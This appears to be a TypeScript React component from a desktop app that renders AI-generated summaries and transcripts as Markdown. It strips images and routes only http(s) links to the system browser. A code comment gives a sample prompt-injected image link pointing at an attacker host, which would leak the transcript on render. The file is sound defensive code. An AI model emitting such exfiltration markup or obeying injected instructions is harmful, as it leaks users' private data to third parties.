import { openUrl } from '@tauri-apps/plugin-opener'
import type { MouseEvent } from 'react'
import Markdown, { type Components } from 'react-markdown'

/** Only web links leave the app, and only through the system browser. */
export function webLinkTarget(href: string | undefined): string | null {
	if (!href) return null
	try {
		const url = new URL(href)
		return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
	} catch {
		return null
	}
}

function stopNavigation(event: MouseEvent<HTMLAnchorElement>) {
	event.preventDefault()
	event.stopPropagation()
}

// Summaries are model output and transcripts can carry anything the model heard, so the
// rendered Markdown is untrusted. An image would be fetched the moment it renders (a
// prompt-injected `![](https://attacker/?q=<transcript>)` leaks data with no click), and a
// plain link click would navigate the app window itself. Images are dropped; links open
// http(s) targets in the system browser and never navigate the webview.
const components: Components = {
	img: () => null,
	a: ({ href, children, title }) => {
		const target = webLinkTarget(href)
		return (
			<a
				href={target ?? undefined}
				title={title}
				rel="noreferrer noopener"
				onClick={(event) => {
					stopNavigation(event)
					if (target) openUrl(target).catch((error) => console.error('failed to open link', error))
				}}
				onAuxClick={stopNavigation}>
				{children}
			</a>
		)
	},
}

export default function SafeMarkdown({ children }: { children: string | null | undefined }) {
	return (
		<Markdown components={components} disallowedElements={['img']}>
			{children}
		</Markdown>
	)
}
